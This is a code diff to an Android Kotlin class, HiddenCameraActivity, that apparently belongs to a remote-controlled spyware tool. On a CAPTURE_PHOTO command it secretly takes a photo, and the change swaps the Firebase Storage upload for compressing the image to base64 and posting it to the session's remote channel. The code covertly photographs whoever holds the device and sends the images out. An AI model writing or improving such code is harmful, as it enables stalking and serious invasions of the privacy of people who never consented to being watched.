@@ -15,7 +15,10 @@ import android.util.Base64
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import com.google.firebase.database.FirebaseDatabase
-import com.google.firebase.storage.FirebaseStorage
+import android.graphics.BitmapFactory
+import android.graphics.Bitmap
+import java.io.ByteArrayOutputStream
+
 import java.nio.ByteBuffer
 
 class HiddenCameraActivity : Activity() {
@@ -87,26 +90,40 @@ class HiddenCameraActivity : Activity() {
                         val bytes = ByteArray(buffer.capacity())
                         buffer.get(bytes)
 
+
                         val currentSession = sessionKey
                         if (currentSession == null) {
                             postResult("ERROR", "Session key missing.", "CAPTURE_PHOTO")
                             return@setOnImageAvailableListener
                         }
 
-                        val storageRef = FirebaseStorage.getInstance().reference
-                        val storagePath = "sessions/$currentSession/files/${System.currentTimeMillis()}_photo.jpg"
-                        val fileRef = storageRef.child(storagePath)
+                        // Decode to Bitmap
+                        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
 
-                        fileRef.putBytes(bytes).addOnSuccessListener {
-                            fileRef.downloadUrl.addOnSuccessListener { uri ->
-                                postResult("IMAGE", "${uri.toString()}|$storagePath", "CAPTURE_PHOTO")
-                            }.addOnFailureListener {
-                                postResult("ERROR", "Failed to get download URL for captured photo.", "CAPTURE_PHOTO")
+                        if (bitmap != null) {
+                            // Scale down if needed
+                            var scaledBitmap = bitmap
+                            if (bitmap.width > 1024 || bitmap.height > 1024) {
+                                val ratio = Math.min(1024f / bitmap.width, 1024f / bitmap.height)
+                                val width = Math.round(ratio * bitmap.width)
+                                val height = Math.round(ratio * bitmap.height)
+                                scaledBitmap = Bitmap.createScaledBitmap(bitmap, width, height, true)
                             }
-                        }.addOnFailureListener {
-                            postResult("ERROR", "Failed to upload captured photo: ${it.message}", "CAPTURE_PHOTO")
+
+                            val baos = ByteArrayOutputStream()
+                            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos)
+                            val imageBytes = baos.toByteArray()
+                            val base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
+                            postResult("IMAGE", base64Image, "CAPTURE_PHOTO")
+
+                            if (scaledBitmap != bitmap) {
+                                scaledBitmap.recycle()
+                            }
+                            bitmap.recycle()
+                        } else {
+                            postResult("ERROR", "Failed to decode captured photo.", "CAPTURE_PHOTO")
                         }
-                    } catch (e: Exception) {
+} catch (e: Exception) {
                         postResult("ERROR", "Failed to process image: ${e.message}", "CAPTURE_PHOTO")
                     } finally {
                         image?.close()
